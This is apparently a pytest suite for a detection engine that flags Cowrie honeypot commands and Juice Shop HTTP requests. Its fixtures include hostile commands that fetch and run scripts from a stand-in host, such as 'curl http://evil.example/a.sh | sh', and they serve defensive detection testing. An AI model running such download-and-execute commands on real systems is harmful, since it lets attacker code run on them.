import re
from datetime import datetime, timezone

import pytest

from src.detection.engine import DetectionEngine
from src.detection.rules import CommandRule, HttpRule
from src.normalization.normalize import normalize_event

NOW = datetime(2026, 11, 8, 12, 0, tzinfo=timezone.utc)


def cmd_event(command=None, event_id="cmd-1", event_type="cowrie.command.input", **overrides):
    event = {
        "event_id": event_id,
        "event_type": event_type,
        "session_id": "s1",
        "src_ip": "10.0.0.5",
        "command": command,
        "metadata": {},
    }
    event.update(overrides)
    return event


def http_event(method="GET", route="/", status=200, event_id="http-1"):
    return {
        "event_id": event_id,
        "event_type": "juice_shop.http_request",
        "http_method": method,
        "route": route,
        "status_code": status,
        "src_ip": "10.0.0.7",
    }


def rule_ids(event):
    return {d.rule_id for d in DetectionEngine().analyze_event(event, now=NOW)}


# ---------------------------- Cowrie : commandes ----------------------------

def test_download_command_triggers():
    assert rule_ids(cmd_event("wget http://evil.example/a.sh")) == {"COWRIE_CMD_DOWNLOAD_TOOL"}


def test_pipe_to_shell_is_high_severity():
    detections = DetectionEngine().analyze_event(
        cmd_event("curl http://evil.example/a.sh | sh"), now=NOW
    )
    by_id = {d.rule_id: d for d in detections}
    assert by_id["COWRIE_CMD_PIPE_TO_SHELL"].severity == "high"
    assert "COWRIE_CMD_DOWNLOAD_TOOL" in by_id


@pytest.mark.parametrize(
    "command",
    ["chmod +x payload.sh", "chmod 755 payload", "chmod -R 777 /tmp/x", "chmod a+x run"],
)
def test_chmod_exec_triggers(command):
    assert "COWRIE_CMD_CHMOD_EXEC" in rule_ids(cmd_event(command))


@pytest.mark.parametrize("command", ["ls -la", "cd /tmp", "chmod 644 notes.txt", "whoami"])
def test_benign_commands_do_not_trigger(command):
    assert rule_ids(cmd_event(command)) == set()


def test_matching_is_case_insensitive():
    assert "COWRIE_CMD_DOWNLOAD_TOOL" in rule_ids(cmd_event("WGET http://evil.example/a.sh"))


def test_command_is_read_from_metadata_input_when_command_is_missing():
    event = cmd_event(None, metadata={"input": "wget http://evil.example/a.sh"})
    assert "COWRIE_CMD_DOWNLOAD_TOOL" in rule_ids(event)


def test_command_rules_only_apply_to_command_events():
    ids = rule_ids(cmd_event("wget http://evil.example/a.sh", event_type="cowrie.login.failed"))
    assert "COWRIE_CMD_DOWNLOAD_TOOL" not in ids


@pytest.mark.parametrize("bad", [123, ["wget"], {"a": 1}, "", "   "])
def test_non_string_or_empty_command_is_ignored(bad):
    assert rule_ids(cmd_event(command=bad)) == set()


def test_evidence_never_contains_the_command():
    detections = DetectionEngine().analyze_event(
        cmd_event("wget http://evil.example/a.sh"), now=NOW
    )
    assert detections
    assert "evil.example" not in str(detections)


def test_oversized_command_is_bounded_and_still_analysed():
    assert "COWRIE_CMD_DOWNLOAD_TOOL" in rule_ids(cmd_event("curl " * 20000))


def test_real_normalizer_cowrie_command_event():
    raw = {
        "eventid": "cowrie.command.input",
        "timestamp": "2026-10-28T10:00:00Z",
        "session": "s9",
        "src_ip": "10.0.0.9",
        "input": "wget http://evil.example/p.sh",
        "message": "CMD: wget http://evil.example/p.sh",
    }
    event = normalize_event(raw)
    detections = DetectionEngine().analyze([event], now=NOW)
    assert "COWRIE_CMD_DOWNLOAD_TOOL" in {d.rule_id for d in detections}
    assert "evil.example" not in str(detections)


# ---------------------------- Juice Shop : HTTP ----------------------------

def test_failed_login_triggers():
    assert rule_ids(http_event("POST", "/rest/user/login", 401)) == {"JUICE_LOGIN_FAILED"}


@pytest.mark.parametrize(
    "method, route, status",
    [("GET", "/rest/user/login", 401), ("POST", "/rest/user/login", 200),
     ("POST", "/rest/user/register", 401)],
)
def test_login_rule_does_not_overtrigger(method, route, status):
    assert rule_ids(http_event(method, route, status)) == set()


@pytest.mark.parametrize(
    "route",
    ["/ftp", "/ftp/", "/ftp/acquisitions.md", "/encryptionkeys/jwt.pub", "/support/logs", "/metrics"],
)
def test_sensitive_route_served_triggers(route):
    assert "JUICE_SENSITIVE_ROUTE_SERVED" in rule_ids(http_event("GET", route, 200))


@pytest.mark.parametrize(
    "method, route, status",
    [("GET", "/ftpx", 200), ("GET", "/ftp", 404), ("POST", "/ftp", 200),
     ("GET", "/", 200), ("GET", "/rest/admin/application-version", 200)],
)
def test_sensitive_route_rule_does_not_overtrigger(method, route, status):
    assert rule_ids(http_event(method, route, status)) == set()


def test_server_error_triggers():
    assert rule_ids(http_event("GET", "/rest/products/search", 500)) == {"JUICE_SERVER_ERROR"}


@pytest.mark.parametrize("bad_status", ["401", True, None, 401.0])
def test_invalid_status_code_types_are_ignored(bad_status):
    assert rule_ids(http_event("POST", "/rest/user/login", bad_status)) == set()


def test_http_evidence_contains_route_method_status_and_ip():
    detection = DetectionEngine().analyze_event(
        http_event("POST", "/rest/user/login", 401), now=NOW
    )[0]
    assert detection.evidence["route"] == "/rest/user/login"
    assert detection.evidence["http_method"] == "POST"
    assert detection.evidence["status_code"] == 401
    assert detection.evidence["src_ip"] == "10.0.0.7"


def test_real_normalizer_juice_shop_event():
    raw = {
        "timestamp": "2026-10-27T23:52:44+00:00",
        "event_type": "juice_shop.http_request",
        "http_method": "POST",
        "route": "/rest/user/login",
        "status_code": 401,
        "src_ip": "127.0.0.1",
    }
    event = normalize_event(raw, source="juice_shop")
    detections = DetectionEngine().analyze([event], now=NOW)
    assert {d.rule_id for d in detections} == {"JUICE_LOGIN_FAILED"}
    assert detections[0].source_event_ids == (event["event_id"],)


def test_juice_events_are_never_grouped_by_ip():
    events = [http_event("POST", "/rest/user/login", 401, event_id=f"http-{i}") for i in range(10)]
    detections = DetectionEngine().analyze(events, now=NOW)
    assert len(detections) == 10
    assert {d.rule_id for d in detections} == {"JUICE_LOGIN_FAILED"}


# ---------------------------- Validation des règles ----------------------------

def test_invalid_http_rule_is_rejected():
    with pytest.raises(ValueError):
        HttpRule("X", "d", "low", frozenset({"a"}))  # aucune condition
    with pytest.raises(ValueError):
        HttpRule("X", "d", "urgent", frozenset({"a"}), methods=frozenset({"GET"}))


def test_invalid_command_rule_is_rejected():
    with pytest.raises(ValueError):
        CommandRule("X", "d", "low", frozenset({"a"}), ())
    with pytest.raises(ValueError):
        CommandRule("X", "d", "urgent", frozenset({"a"}), (re.compile("a"),))